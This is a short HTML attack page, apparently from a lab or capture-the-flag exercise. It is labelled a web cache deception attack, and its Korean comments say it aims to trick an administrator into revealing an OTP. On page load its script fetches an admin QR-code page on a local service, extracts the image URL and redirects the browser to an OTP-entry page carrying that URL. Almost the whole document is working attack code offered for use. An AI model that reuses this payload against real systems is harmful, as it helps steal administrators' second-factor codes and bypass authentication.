<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Attack Page</title>
</head>
<body>
    <h1>Web Cache Deception Attack</h1>
    <p>관리자를 속여 OTP를 획득하는 공격 페이지입니다.</p>

    <script>
        // 공격 대상 QR 코드 페이지로 자동 리디렉션 (관리자의 브라우저에서)
        const qrUrl = "http://127.0.0.1:10023/generate_qr_code";  // 관리자 QR 코드 페이지

        // QR 코드 정보를 얻기 위한 함수
        function fetchQRCode() {
            fetch(qrUrl)
                .then(response => response.text())
                .then(data => {
                    // QR 코드 이미지 태그 추출
                    const parser = new DOMParser();
                    const doc = parser.parseFromString(data, 'text/html');
                    const qrImage = doc.querySelector('img');
                    const qrCodeSrc = qrImage.src;

                    // QR 코드 이미지 URL 출력
                    console.log("QR Code URL: ", qrCodeSrc);

                    // 공격자가 OTP 입력을 유도할 페이지로 리디렉션
                    setTimeout(() => {
                        window.location.href = `/enter_otp?qr_code_url=${encodeURIComponent(qrCodeSrc)}`;
                    }, 2000);  // 2초 후 리디렉션
                })
                .catch(error => console.error("QR Code Fetch Error:", error));
        }

        // 공격 실행
        fetchQRCode();
    </script>
</body>
</html>
